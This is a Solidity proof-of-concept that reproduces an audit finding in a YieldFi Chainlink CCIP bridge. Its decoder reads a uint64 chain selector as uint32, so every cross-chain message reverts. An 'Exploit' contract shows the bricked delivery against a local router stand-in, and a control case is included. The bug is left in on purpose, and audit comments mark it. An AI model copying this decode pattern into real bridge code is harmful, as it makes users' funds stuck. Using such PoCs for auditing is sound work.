// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Synthetic (browser-EVM, cheatcode-free) reproduction of AuditVault #55537 —
// YieldFi CCIP "all messages revert when decoded". The vulnerable decode is the
// REAL YieldFi `Codec.decodeBridgeSendPayload` (uint32 dstId) and the real
// Chainlink CCIPReceiver base; the source `send` packs the uint64 selector. See
// the registry PoC for full provenance.

// ---- real YieldFi libs (byte-identical to YieldFiLabs/smart-contracts) ----
library Common {
    function isContract(address _addr) internal view returns (bool) {
        return _addr != address(0) && _addr.code.length != 0;
    }
}

library Constants {
    bytes32 internal constant BRIDGE_SEND_HASH = keccak256("BRIDGE_SEND");
}

struct BridgeSendPayload {
    uint32 dstId; // @audit BUG: Chainlink selectors are uint64 and exceed uint32.max
    address to;
    address token;
    uint256 amount;
    bytes32 trxnType;
}

error WrongDataLength();
error WrongAddressEncoding();
error WrongData();

library Codec {
    uint256 internal constant DATA_LENGTH = 32 * 5;

    function decodeBridgeSendPayload(bytes memory _data) internal view returns (BridgeSendPayload memory) {
        if (_data.length != DATA_LENGTH) revert WrongDataLength();
        // @audit reverts here: a uint64 chain selector has bits above bit 32, so
        // abi.decode into uint32 fails the high-bit validation.
        (uint32 dstId, address to, address token, uint256 amount, bytes32 trxnType) =
            abi.decode(_data, (uint32, address, address, uint256, bytes32));
        if (trxnType != Constants.BRIDGE_SEND_HASH) revert WrongData();
        if (dstId == 0) revert WrongData();
        if (to == address(0)) revert WrongAddressEncoding();
        if (token == address(0) || !Common.isContract(token)) revert WrongAddressEncoding();
        if (amount == 0) revert WrongData();
        return BridgeSendPayload(dstId, to, token, amount, trxnType);
    }
}

// ---- real Chainlink CCIP framework (smartcontractkit/ccip) ----
library Client {
    struct EVMTokenAmount { address token; uint256 amount; }
    struct Any2EVMMessage {
        bytes32 messageId;
        uint64 sourceChainSelector;
        bytes sender;
        bytes data;
        EVMTokenAmount[] destTokenAmounts;
    }
}

abstract contract CCIPReceiver {
    address internal immutable i_ccipRouter;
    error InvalidRouter(address router);

    constructor(address router) {
        if (router == address(0)) revert InvalidRouter(address(0));
        i_ccipRouter = router;
    }

    function ccipReceive(Client.Any2EVMMessage calldata message) external virtual onlyRouter {
        _ccipReceive(message);
    }

    function _ccipReceive(Client.Any2EVMMessage memory message) internal virtual;

    modifier onlyRouter() {
        if (msg.sender != i_ccipRouter) revert InvalidRouter(msg.sender);
        _;
    }
}

// ---- YieldFi BridgeCCIP (verbatim _ccipReceive prefix from the Cyfrin report) ----
contract BridgeCCIP is CCIPReceiver {
    mapping(bytes32 => bool) public processedMessages;

    constructor(address _router) CCIPReceiver(_router) {}

    function _ccipReceive(Client.Any2EVMMessage memory any2EvmMessage) internal override {
        bytes memory message = abi.decode(any2EvmMessage.data, (bytes));
        BridgeSendPayload memory payload = Codec.decodeBridgeSendPayload(message); // @audit reverts (55537)
        bytes32 _hash = keccak256(abi.encode(message, any2EvmMessage.messageId));
        require(!processedMessages[_hash], "processed");
        processedMessages[_hash] = true;
        require(payload.amount > 0, "!amount");
        // ... audited mint/unlock to payload.to — never reached
    }
}

// ---- the opaque CCIP router boundary (we control it) ----
contract RouterDouble {
    function deliver(BridgeCCIP dest, uint64 sourceSelector, address sender, bytes memory data) external {
        Client.Any2EVMMessage memory m = Client.Any2EVMMessage({
            messageId: keccak256(abi.encode(sourceSelector, data)),
            sourceChainSelector: sourceSelector,
            sender: abi.encode(sender),
            data: data,
            destTokenAmounts: new Client.EVMTokenAmount[](0)
        });
        dest.ccipReceive(m);
    }
}

contract Token {
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 a) external { balanceOf[to] += a; }
}

contract Exploit {
    uint64 internal constant ETH_CCIP_SELECTOR = 5009297550715157269; // > uint32.max
    RouterDouble public router;
    BridgeCCIP public dstBridge;
    Token public remoteToken;
    bool public messageBricked;
    bool public inRangeDecodes;

    constructor() {
        router = new RouterDouble();
        dstBridge = new BridgeCCIP(address(router));
        remoteToken = new Token();
    }

    // Build the payload exactly as BridgeCCIP.send does: the uint64 destination
    // selector as the first field, then abi.encode(bytes) as CCIP `data`.
    function _wireData(uint64 dstSelector) internal view returns (bytes memory) {
        bytes memory inner = abi.encode(
            dstSelector, address(0xB0B), address(remoteToken), uint256(100 ether), Constants.BRIDGE_SEND_HASH
        );
        return abi.encode(inner);
    }

    function run() external payable {
        // (1) A well-formed message carrying the real uint64 Ethereum selector
        // bricks on decode: the router.deliver -> ccipReceive -> Codec decode reverts.
        bytes memory bad = _wireData(ETH_CCIP_SELECTOR);
        (bool ok,) = address(router).call(
            abi.encodeWithSelector(RouterDouble.deliver.selector, dstBridge, ETH_CCIP_SELECTOR, address(this), bad)
        );
        messageBricked = !ok;
        require(messageBricked, "harm: CCIP message should be un-processable");

        // (2) Control: the SAME shape with a uint32-range selector decodes fine,
        // proving the brick is the uint64->uint32 truncation, not a bad payload.
        BridgeSendPayload memory p = Codec.decodeBridgeSendPayload(_innerOnly(uint64(12345)));
        inRangeDecodes = (p.dstId == 12345);
        require(inRangeDecodes, "control: in-range selector must decode");

        require(ETH_CCIP_SELECTOR > type(uint32).max, "selector must exceed uint32");
    }

    function _innerOnly(uint64 dstSelector) internal view returns (bytes memory) {
        return abi.encode(
            dstSelector, address(0xB0B), address(remoteToken), uint256(100 ether), Constants.BRIDGE_SEND_HASH
        );
    }
}
